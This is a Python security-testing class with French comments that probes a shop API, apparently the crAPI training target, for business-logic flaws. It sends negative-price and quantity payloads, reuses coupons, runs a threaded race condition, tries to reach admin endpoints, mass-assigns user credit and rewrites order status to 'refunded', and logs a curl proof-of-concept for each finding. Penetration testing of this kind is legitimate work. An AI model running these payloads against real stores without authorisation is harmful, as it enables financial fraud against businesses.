import httpx
import json
import time
import threading
from rich.console import Console

console = Console()

class BusinessLogicTester:
    def __init__(self, target, token=None):
        self.target = target.rstrip('/')
        self.token = token
        self.headers = {
            'Content-Type': 'application/json',
            'Accept': 'application/json'
        }
        if token:
            self.headers['Authorization'] = f'Bearer {token}'
        self.vulns = []

    def _get(self, path, headers=None):
        try:
            h = headers if headers else self.headers
            return httpx.get(f"{self.target}{path}", headers=h,
                           timeout=10, verify=False, follow_redirects=True)
        except:
            return None

    def _post(self, path, data, headers=None):
        try:
            h = headers if headers else self.headers
            return httpx.post(f"{self.target}{path}", json=data,
                            headers=h, timeout=10, verify=False)
        except:
            return None

    def _put(self, path, data, headers=None):
        try:
            h = headers if headers else self.headers
            return httpx.put(f"{self.target}{path}", json=data,
                           headers=h, timeout=10, verify=False)
        except:
            return None

    def add(self, ep, vtype, sev, desc, poc, impact):
        self.vulns.append({
            'endpoint': ep,
            'type': vtype,
            'severity': sev,
            'description': desc,
            'evidence': desc,
            'poc': poc,
            'business_impact': impact,
            'cvss': 8.5 if sev == 'CRITIQUE' else 6.5 if sev == 'HAUT' else 4.0
        })
        color = "red bold" if sev == "CRITIQUE" else "red" if sev == "HAUT" else "yellow"
        console.print(f"[{color}][!] BUSINESS LOGIC {sev} — {vtype} sur {ep}[/{color}]")

    def test_price_manipulation(self):
        """Test 1 — Manipulation du prix d'achat"""
        console.print("[cyan][*] Test Price Manipulation...[/cyan]")

        # Récupérer les produits
        r = self._get('/workshop/api/v2/shop/products')
        if not r or r.status_code != 200:
            return False

        try:
            products = r.json()
            if not isinstance(products, list) or not products:
                return False

            product_id = products[0].get('id', products[0].get('_id', 1))

            # Test 1 — Prix négatif
            negative_payloads = [
                {"product_id": product_id, "quantity": 1, "amount": -100},
                {"product_id": product_id, "quantity": -1},
                {"product_id": product_id, "quantity": 1, "price": -99.99},
                {"product_id": product_id, "quantity": 0},
            ]

            for payload in negative_payloads:
                r2 = self._post('/workshop/api/v2/shop/orders', payload)
                if r2 and r2.status_code in [200, 201]:
                    resp = r2.text.lower()
                    if any(x in resp for x in ['order', 'success', 'created', 'id']):
                        self.add(
                            '/workshop/api/v2/shop/orders',
                            'PRICE MANIPULATION', 'CRITIQUE',
                            f'Commande acceptée avec valeur invalide: {payload}',
                            f"curl -X POST {self.target}/workshop/api/v2/shop/orders "
                            f"-H 'Authorization: Bearer $TOKEN' "
                            f"-d '{json.dumps(payload)}'",
                            'Achat gratuit ou remboursement frauduleux possible'
                        )
                        return True
        except Exception as e:
            console.print(f"[yellow][~] Price test error: {e}[/yellow]")
        return False

    def test_coupon_abuse(self):
        """Test 2 — Abus de coupon (réutilisation multiple)"""
        console.print("[cyan][*] Test Coupon Abuse...[/cyan]")

        coupons = ["TRAC075", "TRAC050", "PROMO10", "DISCOUNT20"]

        for coupon in coupons:
            # Appliquer le même coupon plusieurs fois
            results = []
            for i in range(3):
                r = self._post('/community/api/v2/coupon/validate-coupon',
                             {"coupon_code": coupon})
                if r:
                    results.append(r.status_code)

            # Si le coupon fonctionne plusieurs fois → vulnérabilité
            success_count = results.count(200)
            if success_count >= 2:
                self.add(
                    '/community/api/v2/coupon/validate-coupon',
                    'COUPON ABUSE', 'HAUT',
                    f'Coupon "{coupon}" utilisable {success_count} fois sans restriction',
                    f"for i in 1 2 3; do curl -X POST {self.target}/community/api/v2/coupon/validate-coupon "
                    f"-H 'Authorization: Bearer $TOKEN' "
                    f"-d '{{\"coupon_code\":\"{coupon}\"}}'; done",
                    'Réductions illimitées — perte financière pour l\'entreprise'
                )
                return True

        return False

    def test_race_condition(self):
        """Test 3 — Race Condition sur achat/transfert"""
        console.print("[cyan][*] Test Race Condition...[/cyan]")

        # Récupérer solde initial
        r_dash = self._get('/identity/api/v2/user/dashboard')
        initial_credit = 0
        if r_dash and r_dash.status_code == 200:
            try:
                initial_credit = r_dash.json().get('available_credit', 0)
                console.print(f"[cyan]    Crédit initial: {initial_credit}[/cyan]")
            except:
                pass

        results = []
        errors = []

        def make_request():
            try:
                r = self._post('/community/api/v2/coupon/validate-coupon',
                             {"coupon_code": "TRAC075"})
                if r:
                    results.append(r.status_code)
            except Exception as e:
                errors.append(str(e))

        # Lancer 10 requêtes simultanées
        threads = []
        for i in range(10):
            t = threading.Thread(target=make_request)
            threads.append(t)

        # Démarrer tous en même temps
        start = time.time()
        for t in threads:
            t.start()
        for t in threads:
            t.join()
        elapsed = time.time() - start

        console.print(f"[cyan]    {len(results)} réponses en {elapsed:.2f}s[/cyan]")

        success_count = results.count(200)
        if success_count >= 3:
            self.add(
                '/community/api/v2/coupon/validate-coupon',
                'RACE CONDITION', 'CRITIQUE',
                f'Race condition détectée: {success_count}/10 requêtes simultanées acceptées',
                f"# Lancer 10 requêtes simultanées:\n"
                f"for i in $(seq 1 10); do curl -s -X POST "
                f"{self.target}/community/api/v2/coupon/validate-coupon "
                f"-H 'Authorization: Bearer $TOKEN' "
                f"-d '{{\"coupon_code\":\"TRAC075\"}}' & done; wait",
                f'Double dépense possible — {success_count} validations simultanées acceptées'
            )
            return True
        return False

    def test_workflow_bypass(self):
        """Test 4 — Bypass d'étapes de workflow"""
        console.print("[cyan][*] Test Workflow Bypass...[/cyan]")

        # Tester accès direct aux étapes finales sans passer par les étapes précédentes
        bypass_tests = [
            # Accéder directement au checkout sans panier
            ('/workshop/api/v2/shop/orders', 'POST',
             {"product_id": 1, "quantity": 1}),
            # Accéder aux rapports sans être mécanicien
            ('/workshop/api/v2/mechanic/mechanic_report', 'GET', None),
            # Accéder admin sans être admin
            ('/identity/api/v2/admin/users', 'GET', None),
        ]

        for endpoint, method, data in bypass_tests:
            if method == 'GET':
                r = self._get(endpoint)
            else:
                r = self._post(endpoint, data) if data else self._get(endpoint)

            if r and r.status_code in [200, 201] and len(r.content) > 50:
                self.add(
                    endpoint,
                    'WORKFLOW BYPASS', 'HAUT',
                    f'Accès direct à {endpoint} sans passer par les étapes requises',
                    f"curl -X {method} {self.target}{endpoint} "
                    f"-H 'Authorization: Bearer $TOKEN'"
                    + (f" -d '{json.dumps(data)}'" if data else ""),
                    'Contournement des contrôles de processus métier'
                )
                return True
        return False

    def test_quantity_manipulation(self):
        """Test 5 — Manipulation de quantité"""
        console.print("[cyan][*] Test Quantity Manipulation...[/cyan]")

        r = self._get('/workshop/api/v2/shop/products')
        if not r or r.status_code != 200:
            return False

        try:
            products = r.json()
            if not products:
                return False

            pid = products[0].get('id', 1)

            # Tester quantités invalides
            for qty in [0, -1, -999, 99999999]:
                r2 = self._post('/workshop/api/v2/shop/orders',
                               {"product_id": pid, "quantity": qty})
                if r2 and r2.status_code in [200, 201]:
                    self.add(
                        '/workshop/api/v2/shop/orders',
                        'QUANTITY MANIPULATION', 'HAUT',
                        f'Quantité invalide acceptée: {qty}',
                        f"curl -X POST {self.target}/workshop/api/v2/shop/orders "
                        f"-H 'Authorization: Bearer $TOKEN' "
                        f"-d '{{\"product_id\":{pid},\"quantity\":{qty}}}'",
                        'Manipulation du stock ou achat frauduleux'
                    )
                    return True
        except:
            pass
        return False

    def test_credit_manipulation(self):
        """Test 6 — Manipulation des crédits utilisateur"""
        console.print("[cyan][*] Test Credit Manipulation...[/cyan]")

        # Vérifier crédit actuel
        r = self._get('/identity/api/v2/user/dashboard')
        if not r or r.status_code != 200:
            return False

        try:
            data = r.json()
            current_credit = data.get('available_credit', 0)
            console.print(f"[cyan]    Crédit actuel: {current_credit}[/cyan]")

            # Tester mise à jour du profil avec crédit modifié
            update_payloads = [
                {"available_credit": 999999},
                {"credit": 999999},
                {"balance": 999999},
            ]

            for payload in update_payloads:
                r2 = self._put('/identity/api/v2/user/profile', payload)
                if not r2:
                    r2 = self._post('/identity/api/v2/user/profile', payload)

                if r2 and r2.status_code in [200, 201]:
                    # Vérifier si le crédit a changé
                    r3 = self._get('/identity/api/v2/user/dashboard')
                    if r3 and r3.status_code == 200:
                        new_credit = r3.json().get('available_credit', 0)
                        if new_credit != current_credit:
                            self.add(
                                '/identity/api/v2/user/profile',
                                'CREDIT MANIPULATION', 'CRITIQUE',
                                f'Crédit modifié de {current_credit} à {new_credit}',
                                f"curl -X PUT {self.target}/identity/api/v2/user/profile "
                                f"-H 'Authorization: Bearer $TOKEN' "
                                f"-d '{json.dumps(payload)}'",
                                'Fraude financière — crédits illimités possibles'
                            )
                            return True
        except Exception as e:
            console.print(f"[yellow][~] Credit test: {e}[/yellow]")
        return False

    def test_order_status_manipulation(self):
        """Test 7 — Manipulation du statut de commande"""
        console.print("[cyan][*] Test Order Status Manipulation...[/cyan]")

        # Récupérer mes commandes
        r = self._get('/workshop/api/v2/shop/orders/all')
        if not r or r.status_code != 200:
            return False

        try:
            orders = r.json()
            if not orders:
                return False

            order_id = orders[0].get('id', orders[0].get('_id', ''))
            if not order_id:
                return False

            # Tenter de changer le statut
            status_payloads = [
                {"status": "delivered"},
                {"status": "refunded"},
                {"status": "cancelled"},
                {"delivered": True},
            ]

            for payload in status_payloads:
                r2 = self._put(f'/workshop/api/v2/shop/orders/{order_id}', payload)
                if r2 and r2.status_code in [200, 201]:
                    self.add(
                        f'/workshop/api/v2/shop/orders/{{id}}',
                        'ORDER STATUS MANIPULATION', 'CRITIQUE',
                        f'Statut de commande modifiable par l\'utilisateur: {payload}',
                        f"curl -X PUT {self.target}/workshop/api/v2/shop/orders/{order_id} "
                        f"-H 'Authorization: Bearer $TOKEN' "
                        f"-d '{json.dumps(payload)}'",
                        'Remboursement frauduleux ou livraison sans paiement'
                    )
                    return True
        except:
            pass
        return False

    def run(self):
        console.print("\n[cyan bold][*] Business Logic Tester — 7 tests...[/cyan bold]")

        results = {
            'Price Manipulation':      self.test_price_manipulation(),
            'Coupon Abuse':            self.test_coupon_abuse(),
            'Race Condition':          self.test_race_condition(),
            'Workflow Bypass':         self.test_workflow_bypass(),
            'Quantity Manipulation':   self.test_quantity_manipulation(),
            'Credit Manipulation':     self.test_credit_manipulation(),
            'Order Status':            self.test_order_status_manipulation(),
        }

        positifs = sum(1 for v in results.values() if v)
        console.print(
            f"[green][+] Business Logic: {len(self.vulns)} vulnérabilités "
            f"— {positifs}/7 tests positifs[/green]"
        )
        return self.vulns
